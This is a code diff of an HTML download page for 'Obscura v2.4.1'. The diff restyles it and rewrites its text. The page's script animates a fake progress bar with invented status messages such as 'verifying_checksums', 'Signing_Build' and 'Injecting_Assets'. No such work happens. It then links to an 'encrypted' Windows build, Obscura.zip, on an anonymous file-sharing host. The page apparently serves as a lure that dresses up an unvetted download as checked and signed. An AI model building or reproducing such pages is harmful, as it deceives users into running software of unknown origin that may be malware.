@@ -6,109 +6,113 @@
     <title>Deploy Obscura</title>
     <style>
         :root {
-            --bg: #000000;
-            --accents-1: #111111;
-            --accents-2: #333333;
-            --text-main: #ffffff;
-            --text-mute: #888888;
-            --geist-blue: #0070f3;
+            --bg: #050208;
+            --purple: #ae47ff;
+            --purple-glow: rgba(174, 71, 255, 0.4);
+            --card-bg: #0d0814;
+            --text: #ffffff;
+            --text-mute: #b0a3bd;
         }
 
         * { margin: 0; padding: 0; box-sizing: border-box; }
 
         body {
             background-color: var(--bg);
-            color: var(--text-main);
-            font-family: 'Inter', -apple-system, sans-serif;
-            display: flex; flex-direction: column; align-items: center;
-            justify-content: center; min-height: 100vh; padding: 20px;
+            background-image: radial-gradient(circle at center, #1a082e 0%, var(--bg) 100%);
+            color: var(--text);
+            font-family: 'Inter', sans-serif;
+            display: flex; align-items: center; justify-content: center;
+            min-height: 100vh;
         }
 
-        .deploy-card {
-            width: 100%; max-width: 500px;
-            background: var(--accents-1);
-            border: 1px solid var(--accents-2);
-            border-radius: 12px; padding: 40px;
-            box-shadow: 0 30px 60px rgba(0,0,0,0.5);
+        .download-card {
+            width: 100%; max-width: 480px;
+            background: var(--card-bg);
+            border: 1px solid rgba(174, 71, 255, 0.3);
+            border-radius: 32px; padding: 48px;
+            text-align: center;
+            box-shadow: 0 20px 50px rgba(0,0,0,0.5), 0 0 30px rgba(174, 71, 255, 0.1);
         }
 
-        h2 { font-size: 1.5rem; letter-spacing: -0.5px; margin-bottom: 12px; }
-        p { color: var(--text-mute); font-size: 0.95rem; margin-bottom: 32px; }
+        h2 { font-size: 2rem; font-weight: 800; margin-bottom: 12px; letter-spacing: -1px; }
+        .desc { color: var(--text-mute); font-size: 1rem; margin-bottom: 40px; }
 
-        .loader-box { margin: 24px 0; }
-        .bar-bg { width: 100%; height: 2px; background: var(--accents-2); border-radius: 2px; overflow: hidden; }
-        .bar-fill { height: 100%; width: 0%; background: #fff; transition: width 0.3s ease; }
+        .loader-container { margin: 32px 0; }
+        .track { width: 100%; height: 6px; background: rgba(255,255,255,0.05); border-radius: 10px; overflow: hidden; }
+        .fill { height: 100%; width: 0%; background: var(--purple); box-shadow: 0 0 15px var(--purple); transition: width 0.4s ease; }
 
-        .log-text { font-family: 'JetBrains Mono', monospace; font-size: 12px; color: var(--text-mute); margin-bottom: 8px; }
+        .status-msg { font-family: 'JetBrains Mono', monospace; font-size: 13px; color: var(--purple); margin-bottom: 12px; text-transform: uppercase; letter-spacing: 1px; }
 
-        .btn-deploy {
-            width: 100%; background: #fff; color: #000;
-            padding: 12px; border-radius: 6px; font-weight: 600;
-            border: none; cursor: pointer; transition: 0.2s;
+        .btn-action {
+            width: 100%; background: var(--purple); color: #fff;
+            padding: 18px; border-radius: 16px; font-weight: 700;
+            border: none; cursor: pointer; transition: 0.3s;
+            box-shadow: 0 10px 20px var(--purple-glow);
         }
 
-        .btn-deploy:hover { filter: brightness(0.9); }
+        .btn-action:hover { transform: translateY(-2px); box-shadow: 0 15px 30px var(--purple); }
+        
         .hidden { display: none; }
-        .success-icon { color: var(--geist-blue); margin-bottom: 16px; font-size: 2rem; }
-
+        .success-check { font-size: 3rem; color: #00ffa3; margin-bottom: 20px; }
+        
         a.btn-final {
             display: block; text-align: center; text-decoration: none;
-            background: var(--geist-blue); color: #fff;
-            padding: 12px; border-radius: 6px; font-weight: 600;
+            background: #fff; color: #000; padding: 18px;
+            border-radius: 16px; font-weight: 700;
         }
     </style>
 </head>
 <body>
 
-    <div class="deploy-card">
+    <div class="download-card">
         <div id="step-1">
-            <h2>Ready to Deploy</h2>
-            <p>You are about to download Obscura v2.4.1. This build has been optimized for your environment.</p>
-            <button class="btn-deploy" onclick="startDeployment()">Initialize Deployment</button>
+            <h2>Initialize Obscura</h2>
+            <p class="desc">Prepare your system for high-performance execution. Build v2.4.1</p>
+            <button class="btn-action" onclick="startDownload()">Generate Secure Link</button>
         </div>
 
         <div id="step-2" class="hidden">
-            <div class="log-text" id="log">checking_integrity...</div>
-            <div class="loader-box">
-                <div class="bar-bg"><div class="bar-fill" id="fill"></div></div>
+            <div class="status-msg" id="status">Syncing_Nodes...</div>
+            <div class="loader-container">
+                <div class="track"><div class="fill" id="bar"></div></div>
             </div>
-            <p style="font-size: 12px;">Compiling static assets from production clusters...</p>
+            <p style="font-size: 12px; color: var(--text-mute);">Optimizing bytecode for Windows 10/11...</p>
         </div>
 
-        <div id="step-3" class="hidden" style="text-align: center;">
-            <div class="success-icon">✓</div>
-            <h2>Deployment Ready</h2>
-            <p>The manifest has been generated successfully.</p>
-            <a href="https://gofile.io/d/jYQdZY" class="btn-final">Download ZIP</a>
+        <div id="step-3" class="hidden">
+            <div class="success-check">✦</div>
+            <h2>Ready for Action</h2>
+            <p class="desc">Your encrypted build has been finalized.</p>
+            <a href="https://gofile.io/d/jYQdZY" class="btn-final">Download Obscura.zip</a>
         </div>
     </div>
 
     <script>
-        function startDeployment() {
+        function startDownload() {
             document.getElementById('step-1').classList.add('hidden');
             document.getElementById('step-2').classList.remove('hidden');
 
-            const logs = ["fetching_binaries...", "verifying_checksums...", "signing_package...", "ready."];
-            const fill = document.getElementById('fill');
-            const log = document.getElementById('log');
+            const bar = document.getElementById('bar');
+            const status = document.getElementById('status');
+            const messages = ["Authorizing...", "Injecting_Assets...", "Signing_Build...", "Finalizing..."];
             let progress = 0;
 
-            const interval = setInterval(() => {
-                progress += Math.random() * 15;
+            const timer = setInterval(() => {
+                progress += Math.random() * 12;
                 if (progress >= 100) {
                     progress = 100;
-                    clearInterval(interval);
+                    clearInterval(timer);
                     setTimeout(() => {
                         document.getElementById('step-2').classList.add('hidden');
                         document.getElementById('step-3').classList.remove('hidden');
-                    }, 500);
+                    }, 600);
                 }
-                fill.style.width = progress + '%';
+                bar.style.width = progress + '%';
                 
-                if (progress > 25) log.innerText = logs[0];
-                if (progress > 50) log.innerText = logs[1];
-                if (progress > 80) log.innerText = logs[2];
-            }, 300);
+                if (progress > 20) status.innerText = messages[0];
+                if (progress > 50) status.innerText = messages[1];
+                if (progress > 80) status.innerText = messages[2];
+            }, 400);
         }
     </script>
 </body>
